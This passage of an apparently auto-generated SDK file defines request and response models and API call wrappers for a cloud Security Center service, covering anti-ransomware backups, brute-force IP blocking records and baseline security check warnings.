  lang?: string(name='Lang', example='zh'),
  pageSize?: int32(name='PageSize', example='20'),
}

model DescribeBackUpExportInfoResponseBody = {
  data?: [ 
    {
      currentCount?: int32(name='CurrentCount', example='29'),
      fileName?: string(name='FileName', example='suspicious_event_20221203'),
      gmtCreate?: long(name='GmtCreate', example='1671607025000'),
      id?: long(name='Id', example='273698***'),
      link?: string(name='Link', example='http://xxx.oss-cn-xxx.aliyuncs.com/export/assetInstance_20221221_1671606250570.zip'),
      message?: string(name='Message', example='success'),
      progress?: int32(name='Progress', example='100'),
      status?: string(name='Status', example='success'),
      totalCount?: int32(name='TotalCount', example='29'),
    }
  ](name='Data'),
  pageInfo?: {
    count?: int32(name='Count', example='9'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='29'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
}

model DescribeBackUpExportInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackUpExportInfoResponseBody(name='body'),
}

async function describeBackUpExportInfoWithOptions(request: DescribeBackUpExportInfoRequest, runtime: Util.RuntimeOptions): DescribeBackUpExportInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.exportType)) {
    query['ExportType'] = request.exportType;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBackUpExportInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeBackUpExportInfo(request: DescribeBackUpExportInfoRequest): DescribeBackUpExportInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackUpExportInfoWithOptions(request, runtime);
}

model DescribeBackupClientsRequest {
  supportRegionId?: string(name='SupportRegionId'),
}

model DescribeBackupClientsResponseBody = {
  clients?: [ 
    {
      clientId?: string(name='ClientId'),
      clientStatus?: string(name='ClientStatus'),
      clientVersion?: string(name='ClientVersion'),
      instanceId?: string(name='InstanceId'),
      uuid?: string(name='Uuid'),
    }
  ](name='Clients'),
  requestId?: string(name='RequestId'),
}

model DescribeBackupClientsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackupClientsResponseBody(name='body'),
}

async function describeBackupClientsWithOptions(request: DescribeBackupClientsRequest, runtime: Util.RuntimeOptions): DescribeBackupClientsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.supportRegionId)) {
    query['SupportRegionId'] = request.supportRegionId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBackupClients',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeBackupClients(request: DescribeBackupClientsRequest): DescribeBackupClientsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackupClientsWithOptions(request, runtime);
}

model DescribeBackupFilesRequest {
  currentPage?: string(name='CurrentPage'),
  pageSize?: string(name='PageSize'),
  path?: string(name='Path'),
  snapshotHash?: string(name='SnapshotHash'),
  uuid?: string(name='Uuid'),
}

model DescribeBackupFilesResponseBody = {
  backupFiles?: [ 
    {
      name?: string(name='Name'),
      size?: long(name='Size'),
      subtree?: string(name='Subtree'),
      type?: string(name='Type'),
    }
  ](name='BackupFiles'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model DescribeBackupFilesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackupFilesResponseBody(name='body'),
}

async function describeBackupFilesWithOptions(request: DescribeBackupFilesRequest, runtime: Util.RuntimeOptions): DescribeBackupFilesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.path)) {
    query['Path'] = request.path;
  }
  if (!Util.isUnset(request.snapshotHash)) {
    query['SnapshotHash'] = request.snapshotHash;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBackupFiles',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeBackupFiles(request: DescribeBackupFilesRequest): DescribeBackupFilesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackupFilesWithOptions(request, runtime);
}

model DescribeBackupMachineStatusRequest {
  policyId?: long(name='PolicyId', description='The ID of the anti-ransomware policy.

>  You can call the [DescribeBackupPolicies](~~DescribeBackupPolicies~~) operation to query the IDs of anti-ransomware policies.', example='123'),
  policyVersion?: string(name='PolicyVersion', description='The version of the anti-ransomware policy. Valid values:

*   **1.0.0**
*   **2.0.0**', example='2.0.0'),
  uuid?: string(name='Uuid', description='The UUID of the server.

>  You can call the [DescribeBackupPolicy](~~DescribeBackupPolicy~~) operation to query the UUIDs of servers.', example='eb2c782e-64f2-4590-a86c-d90164df****'),
}

model DescribeBackupMachineStatusResponseBody = {
  backupMachineStatus?: {
    clientId?: string(name='ClientId', description='The ID of the anti-ransomware agent.', example='c-000dbefaw9f7gnbw****'),
    clientStatus?: string(name='ClientStatus', description='The status of the anti-ransomware agent. Valid values:

*   **ONLINE**: normal
*   **CLIENT_CONNECTION_ERROR**: abnormal
*   **UNINSTALLING**: being uninstalled
*   **UNINSTALL_FAILED**: failed to be uninstalled
*   **UPGRADING**: being upgraded
*   **UPGRADE_FAILED**: failed to be upgraded', example='ONLINE'),
    clientVersion?: string(name='ClientVersion', description='The version of the anti-ransomware agent.', example='2.11.0'),
    errorCode?: string(name='ErrorCode', description='The error code returned.', example='CLIENT_CONNECTION_ERROR'),
    errorList?: [ 
      {
        errorCode?: string(name='ErrorCode', description='The error code returned.', example='TARGET_NOT_EXIST'),
        errorStatus?: string(name='ErrorStatus', description='The error message returned.', example='FAILED'),
      }
    ](name='ErrorList', description='An array that consists of the error information reported by the backup server.'),
    instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-2zeaqkb80vloxjcj****'),
    regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-shenzhen'),
    savedBackupCount?: int32(name='SavedBackupCount', description='The number of backup versions.', example='7'),
    status?: string(name='Status', description='The status of the anti-ransomware agent. Valid values:

*   **NOT_INSTALLED**: not installed
*   **CLIENT_CONNECTION_ERROR**: abnormal
*   **ACTIVATED**: normal', example='ACTIVATED'),
    uuid?: string(name='Uuid', description='The UUID of the server.', example='eb2c782e-64f2-4590-a86c-d90164df****'),
    vaultId?: string(name='VaultId', description='The ID of the backup vault in which the backup data is stored.', example='v-0005i2qh5fcr6seo****'),
  }(name='BackupMachineStatus', description='The backup status of the server.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8****'),
}

model DescribeBackupMachineStatusResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackupMachineStatusResponseBody(name='body'),
}

async function describeBackupMachineStatusWithOptions(request: DescribeBackupMachineStatusRequest, runtime: Util.RuntimeOptions): DescribeBackupMachineStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  if (!Util.isUnset(request.policyVersion)) {
    query['PolicyVersion'] = request.policyVersion;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBackupMachineStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeBackupMachineStatus(request: DescribeBackupMachineStatusRequest): DescribeBackupMachineStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackupMachineStatusWithOptions(request, runtime);
}

model DescribeBackupPoliciesRequest {
  currentPage?: int32(name='CurrentPage'),
  machineRemark?: string(name='MachineRemark'),
  name?: string(name='Name'),
  pageSize?: int32(name='PageSize'),
  status?: string(name='Status'),
}

model DescribeBackupPoliciesResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  policies?: [ 
    {
      clientErrorCount?: int32(name='ClientErrorCount'),
      clientErrorUuidList?: [ string ](name='ClientErrorUuidList'),
      clientStatus?: string(name='ClientStatus'),
      healthClientCount?: int32(name='HealthClientCount'),
      healthClientUuidList?: [ string ](name='HealthClientUuidList'),
      id?: long(name='Id'),
      name?: string(name='Name'),
      policy?: string(name='Policy'),
      policyRegionId?: string(name='PolicyRegionId'),
      policyVersion?: string(name='PolicyVersion'),
      remarkedUuidList?: [ string ](name='RemarkedUuidList'),
      serverType?: string(name='ServerType'),
      serviceErrorCount?: int32(name='ServiceErrorCount'),
      serviceErrorUuidList?: [ string ](name='ServiceErrorUuidList'),
      status?: string(name='Status'),
      upgradeStatus?: string(name='UpgradeStatus'),
      uuidList?: [ string ](name='UuidList'),
    }
  ](name='Policies'),
  requestId?: string(name='RequestId'),
}

model DescribeBackupPoliciesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackupPoliciesResponseBody(name='body'),
}

async function describeBackupPoliciesWithOptions(request: DescribeBackupPoliciesRequest, runtime: Util.RuntimeOptions): DescribeBackupPoliciesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.machineRemark)) {
    query['MachineRemark'] = request.machineRemark;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBackupPolicies',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeBackupPolicies(request: DescribeBackupPoliciesRequest): DescribeBackupPoliciesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackupPoliciesWithOptions(request, runtime);
}

model DescribeBackupPolicyRequest {
  id?: long(name='Id'),
}

model DescribeBackupPolicyResponseBody = {
  backupPolicyDetail?: {
    clientStatus?: string(name='ClientStatus'),
    id?: long(name='Id'),
    name?: string(name='Name'),
    policy?: string(name='Policy'),
    policyVersion?: string(name='PolicyVersion'),
    regionId?: string(name='RegionId'),
    status?: string(name='Status'),
    uuidList?: [ string ](name='UuidList'),
  }(name='BackupPolicyDetail'),
  requestId?: string(name='RequestId'),
}

model DescribeBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackupPolicyResponseBody(name='body'),
}

async function describeBackupPolicyWithOptions(request: DescribeBackupPolicyRequest, runtime: Util.RuntimeOptions): DescribeBackupPolicyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeBackupPolicy(request: DescribeBackupPolicyRequest): DescribeBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackupPolicyWithOptions(request, runtime);
}

model DescribeBackupRestoreCountResponseBody = {
  backupRestoreCount?: {
    recovering?: int32(name='Recovering'),
    total?: int32(name='Total'),
  }(name='BackupRestoreCount'),
  requestId?: string(name='RequestId'),
}

model DescribeBackupRestoreCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBackupRestoreCountResponseBody(name='body'),
}

async function describeBackupRestoreCountWithOptions(runtime: Util.RuntimeOptions): DescribeBackupRestoreCountResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeBackupRestoreCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeBackupRestoreCount(): DescribeBackupRestoreCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBackupRestoreCountWithOptions(runtime);
}

model DescribeBruteForceRecordsRequest {
  blockIp?: string(name='BlockIp', description='The IP address that is blocked by the defense rule.', example='175.106.XX.XX'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page. We recommend that you do not leave this parameter empty.', example='20'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
  status?: int32(name='Status', description='The status of the defense rule. Valid values:

*   **0**: invalid
*   **1**: enabled
*   **2**: failed', example='1'),
}

model DescribeBruteForceRecordsResponseBody = {
  machineList?: [ 
    {
      blockExpireDate?: long(name='BlockExpireDate', description='The timestamp when the block action on the IP address becomes invalid.', example='1671506882063'),
      blockIp?: string(name='BlockIp', description='The IP address that is blocked.', example='10.12.XX.XX'),
      errorCode?: string(name='ErrorCode', description='The error code returned when the defense rule fails to block an IP address.', example='InstanceSecurityGroupLimitExceeded'),
      id?: long(name='Id', description='The primary key ID of the database.', example='112XX'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='record-test-***'),
      internetIp?: string(name='InternetIp', description='The public IP address.', example='120.79.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address.', example='192.168.XX.XX'),
      port?: string(name='Port', description='The port that is attacked.', example='22/22'),
      ruleName?: string(name='RuleName', description='The name of the defense rule.', example='AntiRuleName'),
      source?: string(name='Source', description='The type of the defense rule. Valid values:

*   **userRule**: custom rule
*   **blinkRule**: system rule', example='userRule'),
      status?: int32(name='Status', description='The status of the defense rule. Valid values:

*   **0**: invalid
*   **1**: enabled
*   **2**: failed', example='2'),
      uuid?: string(name='Uuid', description='The UUID of the server on which access from the IP address is blocked.', example='6d5b361f-958d-48a8-a9d2-d6e82c1****'),
    }
  ](name='MachineList', description='An array that consists of the IP addresses.'),
  pageInfo?: {
    count?: int32(name='Count', description='The number of entries returned on the current page.', example='10'),
    currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
    pageSize?: int32(name='PageSize', description='The number of entries returned per page. Default value: **20**.', example='20'),
    totalCount?: int32(name='TotalCount', description='The total number of entries returned.', example='263'),
  }(name='PageInfo', description='The pagination information.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeBruteForceRecordsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBruteForceRecordsResponseBody(name='body'),
}

async function describeBruteForceRecordsWithOptions(request: DescribeBruteForceRecordsRequest, runtime: Util.RuntimeOptions): DescribeBruteForceRecordsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.blockIp)) {
    query['BlockIp'] = request.blockIp;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBruteForceRecords',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeBruteForceRecords(request: DescribeBruteForceRecordsRequest): DescribeBruteForceRecordsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBruteForceRecordsWithOptions(request, runtime);
}

model DescribeBruteForceSummaryRequest {
  resourceOwnerId?: long(name='ResourceOwnerId'),
  sourceIp?: string(name='SourceIp'),
}

model DescribeBruteForceSummaryResponseBody = {
  bruteForceSummary?: {
    allStrategyCount?: int32(name='AllStrategyCount'),
    effectiveCount?: int32(name='EffectiveCount'),
  }(name='BruteForceSummary'),
  requestId?: string(name='RequestId'),
}

model DescribeBruteForceSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeBruteForceSummaryResponseBody(name='body'),
}

async function describeBruteForceSummaryWithOptions(request: DescribeBruteForceSummaryRequest, runtime: Util.RuntimeOptions): DescribeBruteForceSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeBruteForceSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeBruteForceSummary(request: DescribeBruteForceSummaryRequest): DescribeBruteForceSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeBruteForceSummaryWithOptions(request, runtime);
}

model DescribeCheckEcsWarningsRequest {
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='1.2.3.4'),
}

model DescribeCheckEcsWarningsResponseBody = {
  canTry?: string(name='CanTry', description='Indicates whether you use the free trial of Security Center. Valid values:

*   **0**: no
*   **1**: yes', example='0'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='4E5BFDCF-B9DD-430D-9DA4-151BCB581C9D'),
  sasVersion?: string(name='SasVersion', description='The edition of Security Center that you use. Valid values:

*   **1**: Basic edition
*   **2** or **3**: Enterprise edition
*   **5**: Advanced edition
*   **6**: Anti-virus edition

>  Both the value 2 and the value 3 indicate the Enterprise edition.', example='3'),
  weakPasswordCount?: string(name='WeakPasswordCount', description='The number of weak passwords that can cause high risks to your assets.', example='3'),
}

model DescribeCheckEcsWarningsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCheckEcsWarningsResponseBody(name='body'),
}

async function describeCheckEcsWarningsWithOptions(request: DescribeCheckEcsWarningsRequest, runtime: Util.RuntimeOptions): DescribeCheckEcsWarningsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckEcsWarnings',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCheckEcsWarnings(request: DescribeCheckEcsWarningsRequest): DescribeCheckEcsWarningsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckEcsWarningsWithOptions(request, runtime);
}

model DescribeCheckFixDetailsRequest {
  checkIds?: string(name='CheckIds', description='The ID of the risk item.

>  You can call the [DescribeRiskType](~~DescribeRiskType~~) operation to query the IDs of risk items.', example='58'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  riskId?: long(name='RiskId', description='The ID of the baseline.

>  You can call the [DescribeCheckWarningSummary](~~116179~~) operation to query the IDs of baselines.', example='51'),
}

model DescribeCheckFixDetailsResponseBody = {
  checkFixDetails?: [ 
    {
      checkDesc?: string(name='CheckDesc', description='The detailed description of the risk item.', example='Force users not to reuse recently used passwords to reduce the risk of password guessing attacks'),
      checkId?: long(name='CheckId', description='The ID of the risk item.', example='58'),
      checkItem?: string(name='CheckItem', description='The description of the risk item.', example='Ensure password reuse is limited'),
      rules?: [ 
        {
          checkId?: long(name='CheckId', description='The ID of the risk item.', example='58'),
          defaultValue?: int32(name='DefaultValue', description='The default value of the rule.', example='1'),
          optional?: int32(name='Optional', description='Indicates whether the rule is optional. Valid values:

*   **1**: yes
*   **0**: no', example='1'),
          paramList?: [ 
            {
              enumValue?: string(name='EnumValue', description='The options that can be selected for the rule parameter if the value of the ParamType parameter is 2.', example='0,1,2,3'),
              maxValue?: int32(name='MaxValue', description='The maximum value of the rule parameter.', example='24'),
              minValue?: int32(name='MinValue', description='The minimum value of the rule parameter.', example='5'),
              paramDefaultValue?: string(name='ParamDefaultValue', description='The default value of the rule parameter.', example='5'),
              paramDesc?: string(name='ParamDesc', description='The description of the rule parameter.', example='The setting value is 0 means no definition, 1 means success, 2 means failure, 3 means success and failure'),
              paramName?: string(name='ParamName', description='The name of the rule parameter.', example='range_val'),
              paramType?: int32(name='ParamType', description='The type of the rule parameter. Valid values:

*   **1**: input
*   **2**: selection', example='1'),
              ruleId?: string(name='RuleId', description='The ID of the rule.', example='pwd_reuse.system_auth'),
              value?: string(name='Value', description='The specified value of the rule parameter.', example='18'),
            }
          ](name='ParamList', description='An array that consists of the rule parameters.'),
          ruleDesc?: string(name='RuleDesc', description='The description of the rule.', example='(/etc/system-auth)Force users not to reuse the number of recently used passwords between 5 and 24'),
          ruleId?: string(name='RuleId', description='The ID of the rule.', example='pwd_reuse.system_auth'),
          value?: int32(name='Value', description='The specified value of the rule parameter.', example='5'),
          varName?: string(name='VarName', description='The name of the variable.', example='open'),
        }
      ](name='Rules', description='An array consisting of the rules that are supported by the risk item.'),
    }
  ](name='CheckFixDetails', description='An array that consists of the parameters.'),
  count?: int32(name='Count', description='The number of risk items that can be fixed.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='0DBF1E27-98D8-5EC2-9CF3-4A2E26F6****'),
}

model DescribeCheckFixDetailsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCheckFixDetailsResponseBody(name='body'),
}

async function describeCheckFixDetailsWithOptions(request: DescribeCheckFixDetailsRequest, runtime: Util.RuntimeOptions): DescribeCheckFixDetailsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkIds)) {
    query['CheckIds'] = request.checkIds;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckFixDetails',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCheckFixDetails(request: DescribeCheckFixDetailsRequest): DescribeCheckFixDetailsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckFixDetailsWithOptions(request, runtime);
}

model DescribeCheckWarningDetailRequest {
  checkWarningId?: long(name='CheckWarningId', description='The ID of the alert that is triggered by the check item.

>  To query the details about a specified check item, you must provide the ID of the alert that is triggered by the check item. You can call the [DescribeCheckWarnings](~~DescribeCheckWarnings~~) operation to query the IDs of alerts.', example='98675301'),
  lang?: string(name='Lang', description='The language of the content within the request and the response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='103.25.XX.XX'),
}

model DescribeCheckWarningDetailResponseBody = {
  advice?: string(name='Advice', description='The suggestion for the management of the risk item.', example='You can fix it in the following ways:↵1. To configure authentication for redis service, click the redis.conf Configure complex password in requirepass, and then restart redis.↵2. In redis configuration file redis.conf The configuration is as follows: bind 127.0.0.1, only allow local access, and then restart redis'),
  checkId?: long(name='CheckId', description='The ID of the check item.', example='946'),
  description?: string(name='Description', description='The additional information about the risk item.', example='The redis port is open to the outside world and there is no authentication option configured. In addition to directly obtaining all the information in the database, unauthorized users can also attack the system through unauthorized access vulnerability.'),
  item?: string(name='Item', description='The name of the check item.', example='Redis unauthorized access'),
  level?: string(name='Level', description='The risk level of the check item. Valid values:

*   **high**: The item is a high-risk item and is highlighted in red.
*   **medium**: The item is a medium-risk item and is highlighted in orange.
*   **low**: The item is a low-risk item and is highlighted in gray.', example='high'),
  prompt?: string(name='Prompt', description='The prompt for the risk item.', example='weak passwords (username@host/password):root@****/12***'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='BE120DAB-F4E7-4C53-ADC3-A97578ABF384'),
  type?: string(name='Type', description='The type of the check item. Valid values:', example='Security audit'),
}

model DescribeCheckWarningDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCheckWarningDetailResponseBody(name='body'),
}

async function describeCheckWarningDetailWithOptions(request: DescribeCheckWarningDetailRequest, runtime: Util.RuntimeOptions): DescribeCheckWarningDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkWarningId)) {
    query['CheckWarningId'] = request.checkWarningId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeCheckWarningDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeCheckWarningDetail(request: DescribeCheckWarningDetailRequest): DescribeCheckWarningDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeCheckWarningDetailWithOptions(request, runtime);
}

model DescribeCheckWarningMachinesRequest {
  checkId?: long(name='CheckId', description='The ID of the check item.

> You can call the [DescribeCheckWarningSummary](~~116179~~) operation to query the IDs of check items.', example='58'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  riskId?: long(name='RiskId', description='The ID of the baseline.

> You can call the [DescribeCheckWarningSummary](~~116179~~) operation to query the IDs of baselines.', example='43'),
  status?: int32(name='Status', description='The status of the check item.

> This parameter indicates the status of the check item. Valid values:

*   1: failed

*   3: passed', example='1'),
}

model DescribeCheckWarningMachinesResponseBody = {
  count?: int32(name='Count', description='The number of the servers.', example='10'),
  machines?: [ 
    {
      bind?: boolean(name='Bind', description='Indicates whether Security Center is authorized to protect the asset. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      instanceId?: string(name='InstanceId', description='The ID of the server.', example='i-bp1dp42hgn1xcq8l****'),
      instanceName?: string(name='InstanceName', description='The name of the server.', example='win-oracl****'),
      internetIp?: string(name='InternetIp', description='The public IP address of the server.', example='8.210.XX.XX'),
      intranetIp?: string(name='IntranetIp', description='The private IP address of the server.', example='172.25.XX.XX'),
      regionId?: string(name='RegionId', description='The ID of the region in which the server resides.', example='cn-hangzhou'),
      uuid?: string(name='Uuid', description='The UUID of the server.', example='D0D6E6E4-CB8C-4897-B852-46AEFDA0****'),
    }
  ](name='Machines', description='An array consisting of the servers on which the same risk item is detected.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B3D989EB-2E59-584C-8438-5DFAA34A****'),
}

model DescribeCheckWarningMachinesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeCheckWarningMachinesResponseBody(name='body'),
}

